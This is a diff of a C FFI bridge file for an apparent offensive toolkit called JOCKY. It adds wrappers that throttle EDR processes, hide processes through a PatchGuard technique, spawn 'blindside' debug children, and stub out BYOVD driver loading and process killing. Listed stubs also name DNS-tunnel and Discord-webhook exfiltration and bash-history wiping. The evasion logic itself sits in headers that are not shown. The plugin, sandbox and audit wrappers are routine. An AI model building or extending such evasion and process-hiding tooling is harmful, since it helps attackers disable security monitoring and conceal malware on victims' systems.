@@ -145,15 +145,6 @@ void* jocky_realloc(void* ptr, int32_t size) {
    Stub Implementations for Platform-Specific Functions
    ============================================================================ */
 
-/* Sleep/Recheck */
-void jocky_sleep_and_recheck(void) {
-#ifdef _WIN32
-    Sleep(100);
-#else
-    usleep(100000);
-#endif
-}
-
 void jocky_sleep_and_recheck_ms(int ms) {
     if (ms > 0) {
 #ifdef _WIN32
@@ -314,6 +305,18 @@ int32_t linux_forensics_wipe_bash_history(void) { return -1; }
 
 /* Evasion */
 int32_t edrhoker_detect(void) { return -1; }
+#ifdef _WIN32
+#include "evasion/edrhoker.h"
+int32_t edrhoker_throttle(int32_t process_id, int32_t kb_per_sec) {
+    return jocky_edrhoker_throttle_process((uint32_t)process_id, (uint32_t)kb_per_sec);
+}
+int32_t edrhoker_restore(int32_t process_id) {
+    return jocky_edrhoker_remove_throttle((uint32_t)process_id);
+}
+#else
+int32_t edrhoker_throttle(int32_t process_id, int32_t kb_per_sec) { return -1; }
+int32_t edrhoker_restore(int32_t process_id) { return -1; }
+#endif
 int32_t blindside_unhook_ntdll(void) { return -1; }
 
 /* Exfiltration */
@@ -321,9 +324,14 @@ int32_t exfil_dns_tunnel(void) { return -1; }
 int32_t exfil_discord_webhook(void) { return -1; }
 int32_t exfil_local_cdn(void) { return -1; }
 
-/* BTR/BYOVD */
+/* BTR/BYOVD — implementations in windows/execution/btr.c (Windows) */
 int32_t btr_disable_notifications(void) { return -1; }
 int32_t btr_mask_module(const char* dll_name) { return -1; }
+#ifndef _WIN32
+int32_t btr_load_driver(void) { return -1; }
+int32_t btr_delete_file(const char* filename) { return -1; }
+int32_t btr_kill_process(int32_t process_id) { return -1; }
+#endif
 
 /* Crypto */
 int32_t crypto_generate_key(void) { return -1; }
@@ -337,11 +345,129 @@ int32_t ai_collect_telemetry(void) { return -1; }
 
 /* Provenance/Telemetry */
 int32_t provenance_record(void) { return -1; }
-
-/* Common string operation used by compiler */
-char* jocky_str_concat(void* a, void* b) {
-    return string_concat((const char*)a, (const char*)b);
+extern int jocky_provenance_record(const char* source, const char* transform, const char* output);
+int32_t provenance_record_adv(const char* source, const char* transform, const char* output) {
+    return jocky_provenance_record(source, transform, output);
 }
+
+/* Sandbox (Linux-specific advanced operations) */
+int32_t sandbox_set_limits_adv(int32_t pid, int32_t max_memory, int32_t max_cpu_ms) { return -1; }
+
+/* Plugin management - index-based handle over jocky_plugin_* */
+#include "../include/jocky_plugin.h"
+static JOCKY_PLUGIN g_plugins[32];
+static int g_plugin_count = 0;
+
+int32_t plugin_load(const char* path) {
+    if (!path || g_plugin_count >= 32) return -1;
+    JOCKY_PLUGIN* slot = &g_plugins[g_plugin_count];
+    if (jocky_plugin_load(path, slot) != 0) return -1;
+    return g_plugin_count++;
+}
+
+int32_t plugin_run(int32_t handle, const char* args) {
+    if (handle < 0 || handle >= g_plugin_count) return -1;
+    return jocky_plugin_run(&g_plugins[handle], args);
+}
+
+int32_t plugin_unload(int32_t handle) {
+    if (handle < 0 || handle >= g_plugin_count) return -1;
+    return jocky_plugin_unload(&g_plugins[handle]);
+}
+
+int32_t plugin_list(void) {
+    return g_plugin_count;
+}
+
+/* Sandbox adv wrappers */
+extern int jocky_sandbox_spawn(const char* executable, const char* args, uint32_t* out_pid);
+extern int jocky_sandbox_kill(uint32_t pid);
+
+int32_t sandbox_spawn_adv(const char* executable, const char* args) {
+    uint32_t pid = 0;
+    if (jocky_sandbox_spawn(executable, args, &pid) != 0) return -1;
+    return (int32_t)pid;
+}
+
+int32_t sandbox_kill(int32_t pid) {
+    return jocky_sandbox_kill((uint32_t)pid);
+}
+
+/* Audit adv wrappers with global log state */
+#include "../include/jocky_audit.h"
+static JOCKY_AUDIT_LOG g_audit_log = {0};
+static int g_audit_initialized = 0;
+
+static void ensure_audit_init(void) {
+    if (!g_audit_initialized) {
+        jocky_audit_init(&g_audit_log, 100);
+        g_audit_initialized = 1;
+    }
+}
+
+int32_t audit_init_adv(int32_t capacity) {
+    int r = jocky_audit_init(&g_audit_log, (uint32_t)capacity);
+    if (r == 0) g_audit_initialized = 1;
+    return r;
+}
+
+int32_t audit_log_adv(const char* actor, const char* action, const char* input_hash, const char* output_hash) {
+    ensure_audit_init();
+    return jocky_audit_log_action(&g_audit_log, actor, action, input_hash, output_hash);
+}
+
+int32_t audit_verify_adv(void) {
+    ensure_audit_init();
+    int valid = 0;
+    uint32_t broken_at = 0;
+    if (jocky_audit_verify_chain(&g_audit_log, &valid, &broken_at) != 0) return -1;
+    return valid;
+}
+
+int32_t audit_export_adv(const char* filename) {
+    ensure_audit_init();
+    return jocky_audit_export(&g_audit_log, filename);
+}
+
+/* PatchGuard and blindside (Windows-only) */
+#ifdef _WIN32
+#include "kernel/patchguard_peekaboo.h"
+#include "evasion/blindside.h"
+
+static HIDDEN_PROCESS_INFO g_hidden_procs[32];
+static int g_hidden_proc_count = 0;
+
+int32_t patchguard_hide_process(int32_t process_id) {
+    if (g_hidden_proc_count >= 32) return -1;
+    HIDDEN_PROCESS_INFO* info = &g_hidden_procs[g_hidden_proc_count];
+    if (jocky_patchguard_hide_process((uint32_t)process_id, info) != 0) return -1;
+    g_hidden_proc_count++;
+    return 0;
+}
+
+int32_t patchguard_unhide_process(int32_t process_id) {
+    for (int i = 0; i < g_hidden_proc_count; i++) {
+        if (g_hidden_procs[i].pid == (uint32_t)process_id)
+            return jocky_patchguard_unhide_process(&g_hidden_procs[i]);
+    }
+    return -1;
+}
+
+int32_t patchguard_hidden_count(void) {
+    return (int32_t)jocky_patchguard_hidden_count();
+}
+
+int32_t blindside_create_debug_child(const char* executable) {
+    CHILD_PROCESS_CONTEXT ctx = {0};
+    return jocky_blindside_create_debug_child(executable, &ctx);
+}
+
+#else
+int32_t patchguard_hide_process(int32_t process_id) { return -1; }
+int32_t patchguard_unhide_process(int32_t process_id) { return -1; }
+int32_t patchguard_hidden_count(void) { return 0; }
+int32_t blindside_create_debug_child(const char* executable) { return -1; }
+#endif
 
 /* ============================================================================
    FFI Wrapper Functions - Map JOCKY prelude FFI names to C implementations
